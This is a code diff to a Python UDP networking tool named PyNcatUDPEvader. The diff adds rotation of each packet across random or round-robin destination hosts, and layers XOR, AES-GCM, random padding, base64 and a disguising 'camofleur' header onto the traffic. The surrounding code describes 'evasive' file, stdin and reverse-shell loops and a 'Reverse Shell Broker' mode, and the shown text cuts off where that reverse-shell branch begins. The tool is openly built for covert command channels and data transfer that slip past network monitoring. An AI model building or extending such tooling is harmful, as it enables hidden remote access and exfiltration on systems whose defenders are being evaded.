@@ -337,25 +337,75 @@ class PyNcatUDPEvader:
             server.close()
 
     def connect(self):
-        """Dedicated UDP Transmitter featuring Evasive File, Stdin, and Reverse Shell Loops."""
+        """Dedicated UDP Transmitter featuring Multi-Endpoint Rotation Routing."""
         retry_count = 0
         max_retries = self.args.retry
         
-        modes = []
+        # Verify and structure the endpoint collection pool
+        endpoint_pool = self.args.connect # This is now naturally parsed as a list
+        if not endpoint_pool:
+            logging.error("[!] Endpoint rotation target pool is empty.")
+            return
+
+        modes = ["Multi-Endpoint Rotation"]
         if self.args.execute: modes.append("Reverse Shell Broker")
         if self.args.ssl: modes.append("AES-GCM Secure")
         if self.args.xor: modes.append("Stateful Rotational XOR")
-        if self.args.pad_target > 0: modes.append(f"Fixed Size Target [{self.args.pad_target}B]")
-        mode_desc = f"[{' + '.join(modes)}]" if modes else "[Raw Data]"
+        mode_desc = f"[{' + '.join(modes)}]"
+
+        # Simple index pointer used for round-robin strategies if chosen
+        round_robin_index = 0
 
         while True:
             try:
                 client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                target_destination = (self.args.connect, self.args.port)
-                logging.info(f"[*] Pipeline active. Routing to target destination {target_destination[0]}:{target_destination[1]} {mode_desc}")
                 
+                # Setup internal state trackers
                 if self.xor_engine:
                     self.xor_engine.reset_state()
+                
+                def send_packet(payload: bytes):
+                    nonlocal round_robin_index
+                    
+                    # --- CHOOSE ROTATION STRATEGY HERE ---
+                    # Strategy 1: Random Selection (Highly Disruptive)
+                    selected_target_host = random.choice(endpoint_pool)
+                    
+                    # Strategy 2: Round-Robin Selection (Alternative Option)
+                    # selected_target_host = endpoint_pool[round_robin_index]
+                    # round_robin_index = (round_robin_index + 1) % len(endpoint_pool)
+                    # -------------------------------------
+                    
+                    target_destination = (selected_target_host, self.args.port)
+                    logging.debug(f"[*] Dispatching packet block to dynamic target: {target_destination}")
+
+                    # 1. Structural Framing & Security Layers
+                    if self.xor_engine:
+                        seq_header = struct.pack('!I', self.xor_engine.packet_counter)
+                        payload = seq_header + payload
+
+                    if self.args.pad_target > 0:
+                        payload_len = len(payload)
+                        if payload_len + 4 <= self.args.pad_target:
+                            header = struct.pack('!I', payload_len)
+                            padding_needed = self.args.pad_target - (payload_len + 4)
+                            payload = header + payload + os.urandom(padding_needed)
+                    
+                    if self.xor_engine:
+                        payload = self.xor_engine.process(payload)
+                        
+                    if self.args.ssl and self.udp_crypto:
+                        payload = self.udp_crypto.encrypt(payload)
+                        
+                    if self.args.b64:
+                        payload = base64.b64encode(payload)
+                        
+                    if hasattr(self, 'camofleur'):
+                        payload = self.camofleur.apply_header(payload)
+
+                    # 2. Push directly to the dynamically selected target node
+                    client.sendto(payload, target_destination)
+
                 
                 # STRATEGY A: AUTOMATED REVERSE SHELL SUBPROCESS BROKER
                 if self.args.execute:
